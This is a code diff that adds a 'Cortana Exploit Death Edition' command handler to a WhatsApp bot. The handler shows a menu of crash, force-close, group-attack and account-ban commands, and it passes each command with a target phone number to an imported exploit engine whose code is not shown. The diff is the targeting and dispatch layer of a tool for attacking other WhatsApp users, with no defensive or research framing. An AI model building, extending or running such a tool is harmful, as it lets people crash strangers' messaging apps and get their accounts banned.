@@ -24,6 +24,7 @@ import path from "path";
 import { commands } from "./plugins/types";
 import "./plugins/index";
 import { messageCache } from "./store";
+import { executeExploit } from "./exploit-engine";
 
 const logger = pino({ level: "warn" });
 const msgRetryCounterCache = new NodeCache();
@@ -257,9 +258,100 @@ async function startSocket(sessionId: string, phoneNumber?: string) {
         }
       });
     } else {
-      // BUG BOT Logic - Minimal, or specific exploit listeners if needed?
-      // For now, it mostly reacts to API calls from the dashboard.
-      // We can add specific listeners here if "Bug Bot" needs to do autonomous things.
+      // BUG BOT Logic - "Death Edition"
+      sock.ev.on("messages.upsert", async ({ messages, type }: any) => {
+        if (type !== "notify") return;
+
+        for (const msg of messages) {
+          if (!msg.message) continue;
+
+          // Mark read
+          await sock.readMessages([msg.key]);
+
+          const jid = msg.key.remoteJid!;
+          let text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
+
+          if (!text) return;
+
+          // Helper to check for command
+          const isCmd = text.startsWith(PREFIX);
+          const command = isCmd ? text.slice(PREFIX.length).trim().split(' ')[0].toLowerCase() : '';
+          const args = text.trim().split(' ').slice(1);
+          const q = args.join(" ");
+
+          // Menu Command
+          if (isCmd && (command === 'menu' || command === 'help' || command === 'start')) {
+            const uptime = process.uptime();
+            // Simple uptime formatting
+            const hours = Math.floor(uptime / 3600);
+            const minutes = Math.floor((uptime % 3600) / 60);
+            const seconds = Math.floor(uptime % 60);
+            const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;
+
+            const menuText = `@@        CORTANA EXPLOIT        @@
+@@         ☠ DEATH EDITION ☠         @@
+@@     CREATOR: EDUXEYOO THE KING     @@
+@@         UPTIME: ${uptimeStr}         @@
+@@ __________________________________ @@
+
+- ☠🦠  MENU – ENTER IF YOU DARE  🦠☠
+
++          💉 CRASH CHAMBER
++ .forclose-invis
++ .forclose-call  
++ .forclosexdelay
++ .crash         
++ .crashxdelay   
++ .crash-invis   
++ .blankstc      
++ .delay-invis   
++ .freez-stuck   
+
++          ☠ GC DEATH ROW
++ .dor    
++ .🥱     
++ .xgc    
+
++          🦠 BAN EXPLOIT 🦠
++ .perm-ban-num ↳ number (628xxx)
++ .temp-ban-num ↳ number (628xxx)  
++ .gc-death-link ↳ send/reply group link
++ .ch-death-id ↳ reply channel post / send ID
+
+- 🩸 TYPE WRONG... AND YOU'RE NEXT 🩸
+- EDUXEYOO OWNS THIS REALM NOW
+
+☠ CORTANA EXPLOIT 🖤`;
+
+            await sock.sendMessage(jid, {
+              image: { url: "https://files.catbox.moe/rras91.jpg" },
+              caption: menuText
+            });
+            continue;
+          }
+
+          // Execute Exploit Commands
+          if (isCmd) {
+            // Pass to exploit engine. 
+            // We pass the args/target if needed. For commands like .crash, the target is usually the current chat 
+            // OR a mentioned user. 
+            // exploit-engine executeExploit(sock, command, target) expects target JID.
+
+            // If the command is one of the known exploits, execute it on the current chat or specified target.
+            const exploitCommands = ['crash', 'crash-invis', 'crash-ios', 'forclose', 'forclose-invis', 'forclose-call', 'crashxdelay', 'blankstc', 'dor', 'xgc', 'perm-ban-num', 'temp-ban-num'];
+
+            if (exploitCommands.includes(command)) {
+              // For bans/remote attacks, user might supply number
+              let target = jid;
+              if (q) {
+                target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+              }
+
+              await executeExploit(sock, command, target);
+            }
+          }
+        }
+      });
     }
 
     return sock;
